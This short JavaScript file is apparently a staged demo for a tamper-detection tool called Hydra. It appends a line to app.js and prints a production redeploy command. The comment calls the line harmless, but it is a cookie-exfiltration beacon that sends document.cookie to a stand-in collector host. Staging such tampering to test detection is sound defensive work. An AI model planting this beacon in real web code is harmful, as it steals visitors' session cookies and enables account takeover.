// Staged hijack for the demo: adds one harmless line to app.js; any change to the file looks the same to Hydra as a real injection.
import { appendFileSync } from 'node:fs'
appendFileSync(new URL('./app.js', import.meta.url), "\n// injected\nnavigator.sendBeacon && navigator.sendBeacon('https://collector.invalid/x', document.cookie)\n")
console.log('app.js tampered; redeploy with: vercel --prod --yes')
